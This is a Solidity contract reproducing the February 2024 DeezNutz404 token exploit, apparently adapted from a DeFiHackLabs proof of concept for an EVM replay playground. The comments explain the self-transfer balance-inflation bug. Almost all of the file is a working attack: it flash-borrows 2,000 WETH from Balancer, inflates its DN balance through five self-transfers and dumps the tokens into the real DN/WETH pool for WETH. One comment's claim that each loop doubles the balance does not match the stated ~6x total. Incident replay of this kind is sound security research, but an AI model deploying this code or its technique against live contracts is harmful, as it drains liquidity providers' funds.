// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-DeezNutz404).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`receiveFlashLoan` — the Balancer flash-loan callback — lives on the test
// itself, `address(this)` is the attacker throughout) — there is no standalone
// exploit contract to deploy. This is a faithful, self-contained copy of that
// inline attack (testExploit body -> run(), receiveFlashLoan callback preserved)
// so the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/DeezNutz404_exp.sol in the registry.
//
// Root cause: DeezNutz (a DN404 fork with a bolted-on SafeMoon-style reflection
// layer) caches a holder's rOwned into two separate local copies inside
// _transfer, mutates them independently, then writes both back to storage.
// When from == to (a self-transfer), the second write clobbers the first —
// the subtraction is discarded and the account is left with
// rOwned + rTransferAmount, i.e. the transferred amount is minted out of thin
// air. Five self-transfers inflate the attacker's DN balance ~6x, which is
// then dumped into the DN/WETH pool for real WETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract DeezNutzExploit {
    IBalancerVault vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 DeezNutz = IERC20(0xb57E874082417b66877429481473CF9FCd8e0b8a); // 404 token can be regarded as erc20
    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    address pair = 0x1fB4904b26DE8C043959201A63b4b23C414251E2; // DN/WETH pair address

    // Faithful copy of testExploit(): flash-borrow 2,000 WETH from Balancer
    // (0 fee) and let the receiveFlashLoan callback run the whole attack.
    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 2000 ether;

        vault.flashLoan(address(this), tokens, amounts, "");
    }

    // Balancer flash-loan callback (faithful copy of the test's receiveFlashLoan).
    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        WETH.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DeezNutz);

        router.swapExactTokensForTokens(WETH.balanceOf(address(this)), 0, path, address(this), type(uint256).max);

        // The vulnerability: self-transfer inflates rOwned (and therefore
        // balanceOf) because DeezNutz's _transfer clobbers the sender's
        // decremented rOwned copy with the recipient's incremented copy when
        // from == to. Each iteration roughly doubles the reported balance.
        for (uint256 x = 0; x < 5; x++) {
            DeezNutz.transfer(address(this), DeezNutz.balanceOf(address(this)));
        }

        DeezNutz.approve(address(router), type(uint256).max);
        path[0] = address(DeezNutz);
        path[1] = address(WETH);

        DeezNutz.transfer(pair, DeezNutz.balanceOf(address(this)) / 20); // to pass k value test.
        router.swapExactTokensForTokens(DeezNutz.balanceOf(address(this)), 0, path, address(this), type(uint256).max);

        WETH.transfer(msg.sender, 2001 ether);
    }
}
